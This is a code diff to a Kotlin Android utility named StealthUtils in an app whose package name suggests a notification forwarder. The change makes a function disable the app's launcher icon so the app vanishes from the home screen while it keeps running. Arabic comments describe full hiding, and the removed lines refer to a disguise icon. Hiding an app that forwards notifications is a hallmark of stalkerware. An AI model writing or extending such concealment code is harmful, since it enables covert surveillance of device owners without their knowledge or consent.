@@ -6,32 +6,18 @@ import android.content.pm.PackageManager
 
 object StealthUtils {
 
-    fun switchToStealthMode(context: Context) {
+    fun hideAppCompletely(context: Context) {
         val packageManager = context.packageManager
 
-        // 1️⃣ إيقاف الواجهة الأساسية (Pixel-Boy AI)
+        // تعطيل الأيقونة الوحيدة الظاهرة في الشاشة الرئيسية
         val mainAlias = ComponentName(
             context,
             "com.itsazni.notificationforwarder.MainActivityAlias"
         )
-        
-        // 2️⃣ إيقاف أيقونة مركز العثور أيضاً للإخفاء الكامل من الشاشة
-        val stealthAlias = ComponentName(
-            context,
-            "com.itsazni.notificationforwarder.StealthActivityAlias"
-        )
 
         try {
-            // تعطيل الواجهة الرئيسية
             packageManager.setComponentEnabledSetting(
                 mainAlias,
-                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
-                PackageManager.DONT_KILL_APP
-            )
-
-            // تعطيل أيقونة التمويه لليختفي التطبيق بالكامل من الشاشة الرئيسية
-            packageManager.setComponentEnabledSetting(
-                stealthAlias,
                 PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                 PackageManager.DONT_KILL_APP
             )
